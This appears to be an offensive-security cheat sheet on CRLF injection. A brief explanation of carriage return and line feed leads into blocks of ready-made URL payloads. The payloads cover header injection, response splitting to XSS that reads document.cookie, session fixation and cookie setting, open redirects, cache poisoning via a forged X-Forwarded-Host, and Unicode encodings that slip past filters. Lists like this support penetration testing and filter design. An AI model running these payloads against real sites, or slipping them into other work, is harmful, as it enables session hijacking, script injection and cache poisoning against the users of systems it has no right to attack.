# CRLF Injection
The term `CRLF` refers to **Carriage Return** (ASCII 13, `\r`) **Line Feed** (ASCII 10, `\n`). They’re used to note the termination of a line, however, dealt with differently in today’s popular Operating Systems. For example: in Windows both a CR and LF are required to note the end of a line, whereas in Linux/UNIX a LF is only required. In the HTTP protocol, the CR-LF sequence is always used to terminate a line.

A CRLF Injection attack occurs when a user manages to submit a CRLF into an application. This is most commonly done by modifying an HTTP parameter or URL.

## Impacts of CRLF Injection
* XSS
* HTTP Response Splitting
* Open Redirect
* Session Fixation
* HTTP Header Injection
* Web Cache poisoning

## How to Exploit
* **XSS**
```html
# By Disabling XSS Protection
/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23

# By Popping an alert containing sensitive user information
/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2e%2e

# Response splitting on 302 Redirect, before Location header (Discovered in DoD)
%0d%0aContent-Type:%20text%2fhtml%0d%0aHTTP%2f1.1%20200%20OK%0d%0aContent-Type:%20text%2fhtml%0d%0a%0d%0a%3Cscript%3Ealert('XSS');%3C%2fscript%3E

# Response splitting on 301 code, chained with Open Redirect to corrupt location header and to break 301.
# Note: xxx:1 was used for breaking open redirect destination (Location header).
# Great example how of to escalate CRLF to XSS on a such, it would seem, unexploitable 301 status code.
%2Fxxx:1%2F%0aX-XSS-Protection:0%0aContent-Type:text/html%0aContent-Length:39%0a%0a%3cscript%3ealert(document.cookie)%3c/script%3e%2F..%2F..%2F..%2F../tr
```

* **HTTP Response Splitting / Cookie Injection**

HTTP Response Splitting allows an attacker to set malicious cookies on the victim’s browser. In most cases, the following GET request will result in a 307 Redirect, and thus the victim will be redirected to target.com & the URL won’t contain the Set-Cookie parameter. In the background however, the cookie will be set.
```html
# Check if the response is setting this cookie
/%0D%0ASet-Cookie:mycookie=myvalue
```

* **Open Redirect**
```html
//www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
/www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
/google.com/%2F..%0D%0AHeader-Test:test2
/%0d%0aLocation:%20http://example.com
```

* **Session Fixation**

Similar to the Cookie Injection attack, here the attacker sets a user’s session id to a particular value. This link is sent to the victim and when the victim logs in using this session, the attacker can also log in by using the same session id.
```html
/%0d%0aSet-Cookie:session_id=942...
%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```

* **HTTP Header Injection**
```html
%0d%0aheader:header
%0aheader:header
%0dheader:header
%23%0dheader:header
%3f%0dheader:header
/%250aheader:header
/%25250aheader:header
/%%0a0aheader:header
/%3f%0dheader:header
/%23%0dheader:header
/%25%30aheader:header
/%25%30%61header:header
/%u000aheader:header
%E5%98%8A%E5%98%8Dheader:header
```

* **Web Cache poisoning**
```html
/%0d%0aX-Forwarded-Host:hacker.com
```

* **Filter Bypass**
```html
%E5%98%8A = %0A = \u560a
%E5%98%8D = %0D = \u560d
%E5%98%BE = %3E = \u563e (>)
%E5%98%BC = %3C = \u563c (<)
Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```



